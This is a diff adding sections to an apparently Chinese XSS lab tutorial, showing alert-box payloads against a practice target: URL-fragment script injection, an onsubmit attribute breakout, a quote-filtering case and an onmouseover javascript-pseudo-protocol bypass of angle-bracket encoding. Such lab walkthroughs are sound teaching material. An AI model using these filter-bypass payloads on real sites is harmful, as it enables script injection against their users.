@@ -452,6 +452,123 @@ target_sys.com/xss/xss09.php?name=huan%27;alert($a)//
 
 > `#`代表网页中的一个位置，称为锚点。其右面的字符，就是该位置的标识符。
 
+既然知道是怎么回事，那就开始构造攻击，将下面的语句添加到url后面。
+
+```
+#<script>alert("xss")</script>
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822132043.png)
+
+可以看到，页面上已经出现了我们注入的代码，但是在chrome上没有成功执行。
+
+在ie浏览器上尝试，发现没有问题，应该是浏览器将攻击代码做了URL编码后使攻击失效。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822132435.png)
+
+
+
+### URL XSS
+
+源码
+
+```
+<body>
+<h3>level 11</h3>
+<div class='main'>
+
+<form action="/xss/xss11.php" method="post">
+输入你的名字：<input type="text" name="name"/>
+<input type="submit" name="submit"/>
+</form>
+
+</div>
+</body>
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822134000.png)
+
+随便输入恶意代码之后，也只会显示在input框上方，并不会触发任何漏洞。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822144047.png)
+
+这种情况可以考虑通过URL与input输入共同构造xss攻击。
+
+```
+/" onsubmit="alert('xss')
+```
+
+把以上内容添加到url后面，在input框中输入任意内容后点击提交，成功触发漏洞。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822145057.png)
+
+### 特殊字符过滤
+
+打开目标网页，老规矩，先构造最普通的xss攻击方式。
+
+```
+http://target_sys.com/xss/xss12.php?name=huan%3Cscript%3Ealert(%22xss%22)%3C/script%3E
+```
+
+页面没有任何变化，检查网页源码
+
+```
+我的名字是 huan<script>alert(\"xss\")</script>
+```
+
+发现页面中已存在相关代码示例，但是引号已经被做了过滤，导致代码执行失败。那如果我不输入带引号的内容呢？
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822152848.png)
+
+### `<`过滤
+
+常规流程，查看源码。
+
+```
+<div class='main'>
+我的名字是 huan
+<form action="">
+<input type='text' value='huan' name="name">
+<input type="submit" value="提交"/>
+</form>
+</div>
+```
+
+构造原始攻击，并未生效
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822155838.png)
+
+查看源码发现`<`与`>`都被替换了，并且input框中的元素也发生了改变。
+
+```
+<div class='main'>
+我的名字是 &lt;script&gt;alert('XSS')&lt;/script&gt;
+<form action="">
+<input type='text' value='<script>alert('XSS')</script>' name="name">
+<input type="submit" value="提交"/>
+```
+
+那么这时候可以用**js伪协议**来尝试构造攻击
+
+```
+http://target_sys.com/xss/xss13.php?name=moon%27%20onmouseover=%27javascript:alert(%22xss%22)
+```
+
+乍一看浏览器并没有什么反应，再次查看源码
+
+```
+<div class='main'>
+我的名字是 moon' onmouseover='javascript:alert(&quot;xss&quot;)
+<form action="">
+<input type='text' value='moon' onmouseover='javascript:alert("xss")' name="name">
+```
+
+这时候，只要我们的鼠标移动到input框，即可触发攻击，这是因为在JavaScript中，`onmouseover`将鼠标指针移动到图像上时执行 JavaScript。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822160805.png)
+
+
+
 ## 框架示例
 
 
